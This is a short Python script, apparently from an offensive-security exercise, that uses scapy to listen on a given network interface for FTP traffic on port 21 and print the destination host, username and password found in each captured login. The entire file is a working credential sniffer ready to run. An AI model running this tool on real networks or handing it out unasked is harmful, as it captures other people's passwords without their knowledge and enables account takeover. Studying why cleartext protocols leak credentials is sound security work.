#!/usr/bin/python

import optparse
from scapy.all import *

def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)',raw)
    pswd = re.findall('(?i)PASS (.*)',raw)
    if user:
        print('[*] Detected FTP Login To: '+ str(dest))
        print('[+] USER Account: '+ str(user[0]).strip('\r').strip('\n'))
    elif pswd:
        print('[+] Password '+ str(pswd[0]).strip('\r').strip('\n'))    

def main():
    parser = optparse.OptionParser('Usage Of The Program: ' +\
                '-i<interface>')
    parser.add_option('-i', dest='interface', \
        type='string', help='specify interface to listen on')
    (options,args) = parser.parse_args()
    if options.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)    
main()